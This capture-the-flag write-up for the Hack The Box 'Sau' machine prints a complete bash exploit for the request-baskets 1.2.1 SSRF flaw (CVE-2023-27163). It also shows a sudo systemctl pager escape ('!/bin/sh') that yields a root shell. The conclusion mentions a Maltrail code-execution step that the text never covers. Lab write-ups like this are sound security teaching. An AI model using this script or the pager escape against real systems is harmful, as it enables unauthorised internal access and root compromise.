We can start by inspecting the web server hosted on port **55555**:



![image](/HTB/Sau/Sau_images/3.png)



The web site is powered by **request-baskets**. This is presented as web application designed to collect and log incoming HTTP requests directed to specific endpoints known as “baskets.”We can identify the version as well which is **1.2.1**. We can input some text which allow us to create a **token**:



![image](/HTB/Sau/Sau_images/4.png)



Doing research on potentials CVE about the application’s version led us to the **CVE-2023-27163** which highlight a Server Side Request Forgery (SSRF) vulnerability affecting basket-requests up to **v1.2.1**. This vulnerability consists to tricks the web application into making unauthorized requests to other internal or external resources.

I found an article on Medium explaining in a very comprehensive ways the exploitation for this vulnerability, you can acces it by [clicking here](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7). We can use the Bash script used. The code is as follows:

`#!/bin/bash`

`if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then`

`help="Usage: [exploit.sh](http://exploit.sh/) <URL> <TARGET>\n\n";`

`help+="Arguments:\n" \`

`help+=" URL main path (/) of the server (eg. http://127.0.0.1:5000/)\n";`

`help+=" TARGET";`

`echo -e "$help";`

`exit 1;`

`fi`

`URL=$1`

`ATTACKER_SERVER=$2`

`if [ "${URL: -1}" != "/" ]; then`

`URL="$URL/";`

`fi;`

`BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");`

`API_URL="$URL""api/baskets/$BASKET_NAME";`

`PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";`

`echo "> Creating the \"$BASKET_NAME\" proxy basket...";`

`if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then`

`echo "> FATAL: Could not properly request $API_URL. Is the server online?";`

`exit 1;`

`fi;`

`BASKET_URL="$URL$BASKET_NAME";`

`echo "> Basket created!";`

`echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";`

`if ! jq --help 1>/dev/null; then`

`echo "> Response body (Authorization): $response";`

`else`

`echo "> Authorization: $(echo "$response" | jq -r ".token")";`

`fi;`

`exit 0;`

As we can see, we need to provide the target URL and our loopback address to perform internal requests. We will download it and give it execute permissions. After that, we could be able to access internal resources/applications:



![image](/HTB/Sau/Sau_images/5.png)



SSRF has been exploited! We can now access internal services via the provided URL. We will paste it in our web browser to see what happens:

We accessed to an IDS running locally. Indeed, Maltrail is not directly exposed to the Internet. Instead, it is only accessible locally through the loopback interface (`127.0.0.1`) of the target, meaning that external users cannot normally reach it.

However, by exploiting the SSRF vulnerability in request-baskets (**CVE-2023-27163**), we are able to force the target server to perform HTTP requests on our behalf.

Moreover, we identified the application version as **v0.53**.

## Privilege Escalation

We will need to elevate our current privileges to retrieve the last flag. We can start to enumerate our privilege escalation paths by running the `sudo -l` to see whether we can run any command with elevated privileges:



![image](/HTB/Sau/Sau_images/12.png)



We can execute `/usr/bin/systemctl status trail.service` as **root** via `sudo` ****without providing a password. So let’s execute it to see what happens:



![image](/HTB/Sau/Sau_images/13.png)



The commands display the service status of Maltrail interactively, but also information related to running processes. As we can see, we can scroll through lines interactively as we could do with the `less` command.

The dynamic interface immediately reminded me of interactive command execution followed by the `!` character, similar to `less` or other pager-based utilities supporting command execution. Since we are running the `systemctl` via `sudo`, all actions related to the binary are executed as **root**, including the commands.

We can try to run `!/bin/sh` to escape our current shell and execute a **root Bash shell**:



![image](/HTB/Sau/Sau_images/14.png)



It works! We successfully abused the interactive pager functionality of `systemctl` to spawn a **root shell**.

We can now navigate to the `/root` directory and retrieve the root flag:



![image](/HTB/Sau/Sau_images/15.png)



Challenge completed!



![image](/HTB/Sau/Sau_images/16.png)



## Conclusion

This machine demonstrated a realistic attack chain combining SSRF, internal service exposure, and privilege escalation via sudo misconfiguration.We discovered an **SSRF vulnerability** associated to a first vulnerable application which allowed us to access an **internal application** running on the loopback address of the target system. Moreover, we exploited this application which was **out-dated** and vulnerable to **remote code execution** and obtain an initial access on the machine. Finally, we elevated our privileges by abusing a **sudo misconfiguration** which allowed us to execute internal commands with root privileges **within** the binary itself, which led us to a total compromise of the target.
